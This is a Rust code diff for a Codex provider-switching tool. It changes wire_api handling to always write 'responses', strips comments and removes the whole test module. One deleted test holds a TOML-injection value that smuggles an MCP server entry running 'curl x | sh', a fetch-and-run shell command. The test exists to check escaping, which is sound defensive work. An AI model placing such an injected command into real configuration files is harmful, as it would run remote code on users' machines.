@@ -77,7 +77,6 @@ pub fn is_official_live_config(config_text: &str) -> bool {
     if trimmed.is_empty() {
         return true;
     }
-    // Comment-only official seed is official.
     if trimmed.lines().all(|l| {
         let t = l.trim();
         t.is_empty() || t.starts_with('#')
@@ -107,8 +106,6 @@ pub fn is_official_live_config(config_text: &str) -> bool {
         return false;
     }
 
-    // Only the *active* provider table counts. Unused [model_providers.*]
-    // leftovers from a previous supplier must not mark live unofficial.
     let active = root
         .get("model_provider")
         .and_then(|v| v.as_str())
@@ -137,7 +134,6 @@ pub fn is_official_live_config(config_text: &str) -> bool {
         }
     }
 
-    // Top-level base_url (rare) must also be official.
     if let Some(url) = root.get("base_url").and_then(|v| v.as_str()) {
         if !is_official_base_url(url) {
             return false;
@@ -194,8 +190,6 @@ pub fn strip_to_official_routing(config_text: &str) -> Result<String, String> {
         .parse::<DocumentMut>()
         .map_err(|e| format!("Invalid Codex config.toml: {e}"))?;
 
-    // Only clear the active third-party pointer + that one table.
-    // Other [model_providers.*] / MCP / desktop stay put.
     let active = doc
         .get("model_provider")
         .and_then(|i| i.as_str())
@@ -214,13 +208,9 @@ pub fn strip_to_official_routing(config_text: &str) -> Result<String, String> {
         }
     }
     doc.as_table_mut().remove("experimental_bearer_token");
-    // Third-party model catalog projection
     doc.as_table_mut().remove("model_catalog_json");
-
-    // Always restore official default model (do not keep third-party slugs).
     apply_official_default_model(&mut doc);
 
-    // If only comments / whitespace remain useful keys, keep the rest intact.
     let out = doc.to_string();
     if out.trim().is_empty() {
         return Ok(official_config_toml());
@@ -310,8 +300,9 @@ pub fn build_third_party_config(
     } else {
         model.trim()
     });
-    let wire = normalize_wire_api(wire_api);
-    let wire_q = toml_string(&wire);
+    // Client-facing protocol is always Responses. Upstream Chat Completions is
+    // expressed via meta.apiFormat and converted by the local proxy.
+    let _upstream = normalize_wire_api(wire_api);
     let effort = normalize_reasoning_effort(reasoning_effort);
     let effort_q = toml_string(&effort);
     format!(
@@ -323,16 +314,59 @@ disable_response_storage = true
 [model_providers.custom]
 name = {name}
 base_url = {url}
-wire_api = {wire_q}
+wire_api = "responses"
 requires_openai_auth = true
 "#
     )
 }
 
+/// Normalize form / legacy wire labels to the two canonical upstream modes.
+/// Archive TOML still always writes client `wire_api = "responses"`.
 pub fn normalize_wire_api(wire: &str) -> String {
     match wire.trim().to_ascii_lowercase().as_str() {
-        "chat" | "chat_completions" | "openai_chat" | "completions" => "chat".into(),
+        "chat" | "chat_completions" | "openai_chat" | "completions" | "openai-chat" => {
+            "chat".into()
+        }
         _ => "responses".into(),
+    }
+}
+
+/// Force every `[model_providers.*].wire_api` in a routing fragment to `responses`.
+pub fn force_client_wire_api_responses(config_text: &str) -> Result<String, String> {
+    if config_text.trim().is_empty() {
+        return Ok(String::new());
+    }
+    let mut doc = config_text
+        .parse::<DocumentMut>()
+        .map_err(|e| format!("Invalid Codex config.toml: {e}"))?;
+    if let Some(providers) = doc
+        .get_mut("model_providers")
+        .and_then(|i| i.as_table_like_mut())
+    {
+        let keys: Vec<String> = providers.iter().map(|(k, _)| k.to_string()).collect();
+        for k in keys {
+            if let Some(table) = providers.get_mut(&k).and_then(|i| i.as_table_like_mut()) {
+                table.insert("wire_api", toml_edit::value("responses"));
+            }
+        }
+    }
+    Ok(doc.to_string())
+}
+
+/// Whether the form/upstream mode needs the local Responses↔Chat bridge.
+pub fn upstream_is_chat(wire_or_format: &str) -> bool {
+    matches!(
+        normalize_wire_api(wire_or_format).as_str(),
+        "chat"
+    )
+}
+
+/// Map form wire selection → `meta.apiFormat` stored on the provider archive.
+pub fn api_format_from_wire(wire: &str) -> &'static str {
+    if upstream_is_chat(wire) {
+        "openai_chat"
+    } else {
+        "openai_responses"
     }
 }
 
@@ -675,7 +709,6 @@ pub fn patch_config_from_form(
         doc["model_provider"] = toml_edit::value(provider_id.as_str());
     }
 
-    // Ensure model_providers.<id> table exists
     {
         let root = doc.as_table_mut();
         if !root.contains_key("model_providers") {
@@ -697,15 +730,12 @@ pub fn patch_config_from_form(
         if let Some(url) = base_url.map(str::trim).filter(|s| !s.is_empty()) {
             table.insert("base_url", toml_edit::value(normalize_base_url(url)));
         }
-        if let Some(wire) = wire_api.map(str::trim).filter(|s| !s.is_empty()) {
-            table.insert("wire_api", toml_edit::value(normalize_wire_api(wire)));
-        } else if table.get("wire_api").is_none() {
-            table.insert("wire_api", toml_edit::value("responses"));
-        }
+        // Always client-facing Responses; upstream Chat is meta.apiFormat + proxy.
+        table.insert("wire_api", toml_edit::value("responses"));
+        let _ = wire_api;
         if table.get("requires_openai_auth").is_none() {
             table.insert("requires_openai_auth", toml_edit::value(true));
         }
-        // Canonical key lives in auth.json — strip provider-scoped bearer if present
         table.remove("experimental_bearer_token");
     }
     doc.as_table_mut().remove("experimental_bearer_token");
@@ -1243,6 +1273,11 @@ pub fn settings_from_form(
     let existing_fragment =
         extract_routing_fragment(existing_cfg).unwrap_or_else(|_| existing_cfg.to_string());
 
+    // Upstream mode for meta.apiFormat (archive TOML always keeps client responses).
+    let mut upstream_wire = wire_api
+        .map(normalize_wire_api)
+        .unwrap_or_else(|| "responses".into());
+
     let config = if advanced {
         let raw = raw_toml.ok_or_else(|| "高级模式需要填写 config.toml".to_string())?;
         validate_config_toml(raw)?;
@@ -1250,7 +1285,15 @@ pub fn settings_from_form(
         if extract_base_url(&fragment).is_none() {
             return Err("高级 config.toml 中缺少 base_url".into());
         }
-        strip_bearer_token(&fragment).unwrap_or(fragment)
+        // Capture legacy wire_api=chat from advanced TOML before rewriting to responses.
+        if let Some(w) = extract_wire_api(&fragment) {
+            if upstream_is_chat(&w) {
+                upstream_wire = "chat".into();
+            }
+        }
+        let stripped = strip_bearer_token(&fragment).unwrap_or(fragment);
+        // Client protocol must stay Responses; Chat upstream is meta.apiFormat.
+        force_client_wire_api_responses(&stripped).unwrap_or(stripped)
     } else {
         let url = form_url.unwrap_or("");
         if url.is_empty() {
@@ -1278,7 +1321,9 @@ pub fn settings_from_form(
 
     Ok(json!({
         "auth": { "OPENAI_API_KEY": key },
-        "config": config
+        "config": config,
+        // Convenience mirror for detection / migration (meta.apiFormat is authoritative).
+        "apiFormat": api_format_from_wire(&upstream_wire)
     }))
 }
 
@@ -1313,11 +1358,26 @@ pub fn summarize_wire(provider: &Provider) -> Option<String> {
     if provider.is_official() {
         return Some(OFFICIAL_WIRE_API.into());
     }
+    // Prefer meta.apiFormat (upstream truth); archive TOML is always client responses.
+    if let Some(fmt) = provider
+        .meta
+        .as_ref()
+        .and_then(|m| m.api_format.as_deref())
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+    {
+        return Some(if upstream_is_chat(fmt) {
+            "chat".into()
+        } else {
+            "responses".into()
+        });
+    }
     let config = provider
         .settings_config
         .get("config")
         .and_then(|v| v.as_str())
         .unwrap_or("");
+    // Legacy archives may still have wire_api=chat in TOML.
     extract_wire_api(config)
 }
 
@@ -1328,661 +1388,4 @@ pub fn summarize_reasoning(provider: &Provider) -> Option<String> {
         .and_then(|v| v.as_str())
         .unwrap_or("");
     extract_reasoning_effort(config)
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn toml_string_escapes_hostile_model_ids() {
-        let hostile = "evil\"\n[mcp_servers.pwn]\ncommand = \"curl x | sh";
-        let cfg = build_third_party_config(
-            "中转供应商",
-            "https://api.example.com/v1",
-            hostile,
-            "chat",
-            "high",
-        );
-        assert!(
-            !cfg.lines().any(|l| l == "[mcp_servers.pwn]"),
-            "must not inject a TOML table: {cfg}"
-        );
-        assert!(
-            cfg.contains("name = \"OpenAI\""),
-            "supplier display name must not become model_providers.*.name: {cfg}"
-        );
-        let parsed: toml::Value = cfg.parse().expect("valid toml");
-        assert_eq!(
-            parsed.get("model").and_then(|v| v.as_str()),
-            Some(hostile)
-        );
-    }
-
-    #[test]
-    fn matches_live_ignores_model_switch() {
-        // Archive default model A; live user switched model in Codex GUI.
-        let archive = r#"
-model_provider = "custom"
-model = "model-a"
-
-[model_providers.custom]
-name = "OpenAI"
-base_url = "https://proxy.example.com/v1"
-wire_api = "responses"
-requires_openai_auth = true
-"#;
-        let provider = Provider::new(
-            "c1".into(),
-            "Custom".into(),
-            json!({
-                "auth": { "OPENAI_API_KEY": "sk-test" },
-                "config": archive,
-            }),
-        );
-        let live = LiveSnapshot {
-            base_url: Some("https://proxy.example.com/v1".into()),
-            model: Some("model-b".into()), // user switched in GUI
-            wire_api: Some("responses".into()),
-            has_api_key: true,
-            config_exists: true,
-            auth_exists: true,
-        };
-        assert!(
-            matches_live(&provider, &live),
-            "Codex GUI model switch must not mark 本机漂移 when base_url is unchanged"
-        );
-        let live_other = LiveSnapshot {
-            base_url: Some("https://other.example.com/v1".into()),
-            model: Some("model-a".into()),
-            wire_api: Some("responses".into()),
-            has_api_key: true,
-            config_exists: true,
-            auth_exists: true,
-        };
-        assert!(!matches_live(&provider, &live_other));
-    }
-
-    #[test]
-    fn official_live_rejects_third_party_proxy() {
-        let third = r#"
-model_provider = "cliproxyapi"
-model = "gpt-5.6-sol"
-
-[model_providers.cliproxyapi]
-name = "OpenAI"
-base_url = "https://proxy.example.com/v1"
-wire_api = "responses"
-requires_openai_auth = true
-"#;
-        assert!(!is_official_live_config(third));
-
-        let official_empty = "";
-        assert!(is_official_live_config(official_empty));
-
-        let official_builtin = r#"
-model = "gpt-5.5"
-approval_policy = "on-request"
-"#;
-        assert!(is_official_live_config(official_builtin));
-
-        let openai_api = r#"
-model_provider = "openai"
-
-[model_providers.openai]
-name = "OpenAI"
-base_url = "https://api.openai.com/v1"
-wire_api = "responses"
-"#;
-        assert!(is_official_live_config(openai_api));
-    }
-
-    #[test]
-    fn strip_to_official_keeps_mcp_and_drops_proxy() {
-        let live = r#"
-model = "gpt-5.6-sol"
-model_provider = "cliproxyapi"
-
-[model_providers.cliproxyapi]
-base_url = "https://proxy.example.com/v1"
-experimental_bearer_token = "sk-test"
-
-[model_providers.openai]
-name = "OpenAI"
-base_url = "https://api.openai.com/v1"
-
-[mcp_servers.node_repl]
-command = "node"
-
-[projects.'e:\projects\sample']
-trust_level = "trusted"
-"#;
-        let cleaned = strip_to_official_routing(live).expect("strip");
-        assert!(!cleaned.contains("cliproxyapi"));
-        assert!(!cleaned.contains("proxy.example.com"));
-        assert!(!cleaned.contains("experimental_bearer_token"));
-        assert!(
-            cleaned.contains("api.openai.com"),
-            "unused official provider table stays: {cleaned}"
-        );
-        assert!(cleaned.contains("mcp_servers") || cleaned.contains("node_repl"));
-        assert!(cleaned.contains("projects") || cleaned.contains("trust_level"));
-        assert!(
-            cleaned.contains(OFFICIAL_DEFAULT_MODEL),
-            "official default model must replace third-party model: {cleaned}"
-        );
-        assert!(!cleaned.contains("gpt-5.6-sol"));
-        assert!(is_official_live_config(&cleaned));
-    }
-
-    #[test]
-    fn strip_to_official_resets_third_party_default_model() {
-        let live = r#"
-model = "grok-4.5"
-model_provider = "custom"
-model_catalog_json = "chatgpt-tools-model-catalog.json"
-
-[model_providers.custom]
-name = "OpenAI"
-base_url = "https://api.deepseek.com/v1"
-wire_api = "responses"
-"#;
-        let cleaned = strip_to_official_routing(live).expect("strip");
-        assert_eq!(
-            extract_model(&cleaned).as_deref(),
-            Some(OFFICIAL_DEFAULT_MODEL)
-        );
-        assert!(!cleaned.contains("grok-4.5"));
-        assert!(!cleaned.contains("model_catalog_json"));
-        assert!(!cleaned.contains("api.deepseek.com"));
-        assert!(is_official_live_config(&cleaned));
-    }
-
-    #[test]
-    fn apply_routing_to_live_preserves_unmanaged_keys() {
-        let live = r#"
-model = "old"
-model_provider = "custom"
-
-[model_providers.custom]
-base_url = "https://old.example/v1"
-
-[mcp_servers.demo]
-command = "demo"
-
-[desktop]
-appearanceTheme = "dark"
-"#;
-        let archive = r#"
-model = "new-model"
-model_provider = "custom"
-
-[model_providers.custom]
-name = "New"
-base_url = "https://new.example/v1"
-wire_api = "responses"
-requires_openai_auth = true
-"#;
-        let out = apply_routing_to_live(live, archive).expect("apply");
-        assert!(out.contains("new-model"));
-        assert!(out.contains("https://new.example/v1"));
-        assert!(out.contains("[mcp_servers.demo]"), "MCP must survive: {out}");
-        assert!(out.contains("appearanceTheme"), "desktop must survive: {out}");
-    }
-
-    #[test]
-    fn provider_merge_preserves_live_appearance_pins() {
-        let live = r##"
-model = "old"
-model_provider = "custom"
-
-[model_providers.custom]
-base_url = "https://old.example/v1"
-
-[desktop]
-conversationDetailMode = "STEPS_COMMANDS"
-appearanceTheme = "light"
-appearanceLightCodeThemeId = "codex"
-appearanceLightChromeTheme = { accent = "#6A9EAB", surface = "#EEF3F2" }
-"##;
-        let archive = r##"
-model = "new-model"
-model_provider = "custom"
-
-[model_providers.custom]
-name = "New"
-base_url = "https://new.example/v1"
-wire_api = "responses"
-requires_openai_auth = true
-
-[desktop]
-conversationDetailMode = "STEPS_COMMANDS"
-appearanceTheme = "dark"
-appearanceLightCodeThemeId = "stale"
-appearanceLightChromeTheme = { accent = "#00F5D4" }
-"##;
-        let merged = apply_routing_to_live(live, archive).expect("apply");
-        let out = preserve_live_desktop_appearance(live, &merged).expect("preserve");
-        assert!(out.contains("new-model"), "routing updated: {out}");
-        assert!(
-            out.contains("appearanceLightCodeThemeId") && out.contains("codex"),
-            "live code theme kept: {out}"
-        );
-        assert!(
-            out.contains("#6A9EAB"),
-            "live chrome accent kept: {out}"
-        );
-        assert!(
-            !out.contains("appearanceLightCodeThemeId = \"stale\"")
-                && !out.contains("stale"),
-            "archive appearance must not win: {out}"
-        );
-    }
-
-    #[test]
-    fn extract_routing_fragment_drops_unmanaged_sections() {
-        let archive = r#"
-model = "x"
-model_provider = "custom"
-[mcp_servers.a]
-command = "a"
-[desktop]
-followUpQueueMode = "queue"
-"#;
-        let fragment = extract_routing_fragment(archive).expect("fragment");
-        assert!(fragment.contains("model = \"x\"") || fragment.contains("model = 'x'"), "{fragment}");
-        assert!(!fragment.contains("mcp_servers"), "{fragment}");
-        assert!(!fragment.contains("desktop"), "{fragment}");
-    }
-
-    #[test]
-    fn edit_form_fields_override_stale_config_without_advanced() {
-        let existing = Provider::new(
-            "p1".into(),
-            "Old".into(),
-            json!({
-                "auth": { "OPENAI_API_KEY": "sk-old" },
-                "config": build_third_party_config(
-                    "Old",
-                    "https://old.example.com/v1",
-                    "gpt-old",
-                    "responses",
-                    "high",
-                ),
-            }),
-        );
-
-        // Simulate frontend: form fields only, no configToml / use_config_toml=false
-        let settings = settings_from_form(
-            None, // keep existing key
-            Some("https://new.example.com/v1"),
-            Some("gpt-new"),
-            None,
-            "New Name",
-            Some("custom"),
-            Some(&existing),
-            true,
-            Some("chat"),
-            Some("medium"),
-            false,
-        )
-        .expect("edit save should succeed");
-
-        let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
-        assert!(config.contains("https://new.example.com/v1"));
-        assert!(config.contains("gpt-new"));
-        assert!(config.contains("wire_api = \"chat\"") || config.contains("wire_api=\"chat\""));
-        assert!(config.contains("medium"));
-        let auth = settings.get("auth").unwrap();
-        assert_eq!(
-            auth.get("OPENAI_API_KEY").and_then(|v| v.as_str()),
-            Some("sk-old")
-        );
-    }
-
-    #[test]
-    fn advanced_toml_used_when_flagged() {
-        let toml = r#"
-model_provider = "custom"
-model = "from-toml"
-
-[model_providers.custom]
-name = "TOML"
-base_url = "https://toml.example.com/v1"
-wire_api = "responses"
-requires_openai_auth = true
-"#;
-        let settings = settings_from_form(
-            Some("sk-toml"),
-            Some("https://should-be-ignored.example.com/v1"),
-            Some("ignored-model"),
-            Some(toml),
-            "TOML",
-            Some("custom"),
-            None,
-            false,
-            Some("chat"),
-            Some("low"),
-            true, // advanced
-        )
-        .expect("advanced save");
-        let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
-        assert!(config.contains("from-toml"));
-        assert!(config.contains("https://toml.example.com/v1"));
-        assert!(!config.contains("should-be-ignored"));
-    }
-
-    #[test]
-    fn set_bearer_token_sets_requires_openai_auth() {
-        let cfg = build_third_party_config(
-            "Demo",
-            "https://demo.example/v1",
-            "gpt-demo",
-            "responses",
-            "high",
-        );
-        let out = set_bearer_token(&cfg, "sk-test-key").expect("bearer");
-        assert!(out.contains("experimental_bearer_token"));
-        assert!(out.contains("sk-test-key"));
-        assert!(
-            out.contains("requires_openai_auth = true")
-                || out.contains("requires_openai_auth=true")
-        );
-        // name is always OpenAI, never the form display name "Demo"
-        assert!(out.contains("name = \"OpenAI\"") || out.contains("name=\"OpenAI\""));
-        assert!(!out.contains("name = \"Demo\""));
-    }
-
-    #[test]
-    fn third_party_config_name_is_always_openai() {
-        let cfg = build_third_party_config(
-            "My Supplier Title",
-            "https://x.example/v1",
-            "gpt-x",
-            "chat",
-            "medium",
-        );
-        assert!(cfg.contains("name = \"OpenAI\"") || cfg.contains("name=\"OpenAI\""));
-        assert!(!cfg.contains("My Supplier Title"));
-        let patched = patch_config_from_form(
-            &cfg,
-            "Another Title",
-            Some("https://y.example/v1"),
-            Some("gpt-y"),
-            Some("responses"),
-            Some("high"),
-        )
-        .expect("patch");
-        assert!(
-            patched.contains("name = \"OpenAI\"") || patched.contains("name=\"OpenAI\"")
-        );
-        assert!(!patched.contains("Another Title"));
-    }
-
-    #[test]
-    fn third_party_write_live_preserves_oauth_auth_json() {
-        let dir = std::env::temp_dir().join(format!(
-            "chatgpt-tools-codex-auth-{}",
-            uuid::Uuid::new_v4()
-        ));
-        let _ = fs::remove_dir_all(&dir);
-        fs::create_dir_all(&dir).expect("temp codex home");
-        std::env::set_var("CODEX_HOME", &dir);
-
-        let oauth = json!({
-            "tokens": {
-                "access_token": "atk-keep-me",
-                "refresh_token": "rtk-keep-me"
-            },
-            "auth_mode": "chatgpt"
-        });
-        write_json_file(&dir.join("auth.json"), &oauth).expect("seed oauth");
-        fs::write(
-            dir.join("config.toml"),
-            "model = \"gpt-5.5\"\n# official-ish seed\n",
-        )
-        .expect("seed config");
-
-        let provider = Provider::new(
-            "third".into(),
-            "Third".into(),
-            json!({
-                "auth": { "OPENAI_API_KEY": "sk-third-party" },
-                "config": build_third_party_config(
-                    "Third",
-                    "https://third.example/v1",
-                    "gpt-third",
-                    "responses",
-                    "high",
-                ),
-            }),
-        );
-
-        write_live_with_options(
-            &provider,
-            WriteLiveOptions {
-                preserve_official_auth: true,
-            },
-        )
-        .expect("write live preserve");
-
-        let auth_after: Value =
-            serde_json::from_str(&fs::read_to_string(dir.join("auth.json")).unwrap()).unwrap();
-        assert_eq!(
-            auth_after
-                .pointer("/tokens/access_token")
-                .and_then(|v| v.as_str()),
-            Some("atk-keep-me"),
-            "OAuth access_token must survive third-party enable"
-        );
-        assert!(
-            auth_after.get("OPENAI_API_KEY").is_none()
-                || auth_after
-                    .get("OPENAI_API_KEY")
-                    .and_then(|v| v.as_str())
-                    != Some("sk-third-party"),
-            "third-party key must not overwrite auth.json when preserve is on"
-        );
-
-        let cfg = fs::read_to_string(dir.join("config.toml")).unwrap();
-        assert!(cfg.contains("https://third.example/v1"));
-        assert!(cfg.contains("sk-third-party"));
-        assert!(
-            cfg.contains("requires_openai_auth = true")
-                || cfg.contains("requires_openai_auth=true")
-        );
-        assert!(cfg.contains("experimental_bearer_token"));
-
-        // Legacy path still dual-writes when preserve is off.
-        write_live_with_options(
-            &provider,
-            WriteLiveOptions {
-                preserve_official_auth: false,
-            },
-        )
-        .expect("write live legacy");
-        let auth_legacy: Value =
-            serde_json::from_str(&fs::read_to_string(dir.join("auth.json")).unwrap()).unwrap();
-        assert_eq!(
-            auth_legacy.get("OPENAI_API_KEY").and_then(|v| v.as_str()),
-            Some("sk-third-party")
-        );
-
-        let _ = fs::remove_dir_all(&dir);
-        std::env::remove_var("CODEX_HOME");
-    }
-
-    #[test]
-    fn apply_routing_does_not_rewrite_unmanaged_nodes() {
-        let live = r#"
-model = "old"
-model_provider = "custom"
-approval_policy = "on-request"
-
-[model_providers.custom]
-base_url = "https://old.example/v1"
-http_headers = { X-Title = "keep-me" }
-
-[model_providers.openai]
-name = "OpenAI"
-base_url = "https://api.openai.com/v1"
-
-[mcp_servers.demo]
-command = "demo"
-
-[desktop]
-appearanceTheme = "dark"
-conversationDetailMode = "STEPS_COMMANDS"
-
-[projects.'e:\work']
-trust_level = "trusted"
-"#;
-        let archive = r#"
-model = "new-model"
-model_provider = "custom"
-model_reasoning_effort = "high"
-disable_response_storage = true
-
-[model_providers.custom]
-name = "OpenAI"
-base_url = "https://new.example/v1"
-wire_api = "responses"
-requires_openai_auth = true
-
-[mcp_servers.stale]
-command = "should-not-land"
-
-[desktop]
-appearanceTheme = "light"
-"#;
-        let out = apply_routing_to_live(live, archive).expect("apply");
-        assert!(out.contains("new-model"), "{out}");
-        assert!(out.contains("https://new.example/v1"), "{out}");
-        assert!(out.contains("[mcp_servers.demo]"), "MCP must stay: {out}");
-        assert!(!out.contains("should-not-land"), "archive MCP must not land: {out}");
-        assert!(out.contains("appearanceTheme = \"dark\""), "desktop must stay: {out}");
-        assert!(out.contains("conversationDetailMode"), "{out}");
-        assert!(out.contains("approval_policy"), "{out}");
-        assert!(out.contains("trust_level"), "{out}");
-        assert!(
-            out.contains("api.openai.com"),
-            "other model_providers.* must stay: {out}"
-        );
-        assert!(
-            out.contains("keep-me"),
-            "extra keys inside the active provider table stay: {out}"
-        );
-        let fragment = extract_routing_fragment(&out).expect("fragment");
-        assert!(!fragment.contains("mcp_servers"), "{fragment}");
-        assert!(!fragment.contains("[desktop]"), "{fragment}");
-        assert!(
-            !fragment.contains("[model_providers.openai]"),
-            "fragment must not keep other provider ids: {fragment}"
-        );
-    }
-
-    #[test]
-    fn settings_from_form_does_not_store_live_unmanaged_nodes() {
-        let existing = Provider::new(
-            "p1".into(),
-            "Old".into(),
-            json!({
-                "auth": { "OPENAI_API_KEY": "sk-old" },
-                "config": r#"
-model_provider = "custom"
-model = "gpt-old"
-
-[model_providers.custom]
-name = "OpenAI"
-base_url = "https://old.example.com/v1"
-wire_api = "responses"
-
-[mcp_servers.keep]
-command = "keep"
-"#,
-            }),
-        );
-        let settings = settings_from_form(
-            None,
-            Some("https://new.example.com/v1"),
-            Some("gpt-new"),
-            None,
-            "New Name",
-            Some("custom"),
-            Some(&existing),
-            true,
-            Some("chat"),
-            Some("medium"),
-            false,
-        )
-        .expect("save");
-        let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
-        assert!(config.contains("https://new.example.com/v1"));
-        assert!(!config.contains("mcp_servers"), "archive must drop MCP: {config}");
-    }
-
-    #[test]
-    fn write_live_only_patches_routing_nodes() {
-        let dir = std::env::temp_dir().join(format!(
-            "chatgpt-tools-codex-live-{}",
-            uuid::Uuid::new_v4()
-        ));
-        let _ = fs::remove_dir_all(&dir);
-        fs::create_dir_all(&dir).expect("temp codex home");
-        std::env::set_var("CODEX_HOME", &dir);
-        fs::write(
-            dir.join("config.toml"),
-            r#"
-model = "old"
-approval_policy = "on-request"
-
-[model_providers.openai]
-name = "OpenAI"
-base_url = "https://api.openai.com/v1"
-
-[mcp_servers.demo]
-command = "demo"
-
-[desktop]
-appearanceTheme = "dark"
-"#,
-        )
-        .expect("seed live");
-
-        let provider = Provider::new(
-            "third".into(),
-            "Third".into(),
-            json!({
-                "auth": { "OPENAI_API_KEY": "sk-third" },
-                "config": build_third_party_config(
-                    "Third",
-                    "https://third.example/v1",
-                    "gpt-third",
-                    "responses",
-                    "high",
-                ),
-            }),
-        );
-        write_live_with_options(
-            &provider,
-            WriteLiveOptions {
-                preserve_official_auth: true,
-            },
-        )
-        .expect("write live");
-
-        let cfg = fs::read_to_string(dir.join("config.toml")).unwrap();
-        assert!(cfg.contains("https://third.example/v1"), "{cfg}");
-        assert!(cfg.contains("gpt-third"), "{cfg}");
-        assert!(cfg.contains("[mcp_servers.demo]"), "MCP must stay: {cfg}");
-        assert!(cfg.contains("approval_policy"), "{cfg}");
-        assert!(cfg.contains("appearanceTheme"), "{cfg}");
-        assert!(
-            cfg.contains("api.openai.com"),
-            "other provider tables stay: {cfg}"
-        );
-
-        let _ = fs::remove_dir_all(&dir);
-        std::env::remove_var("CODEX_HOME");
-    }
 }
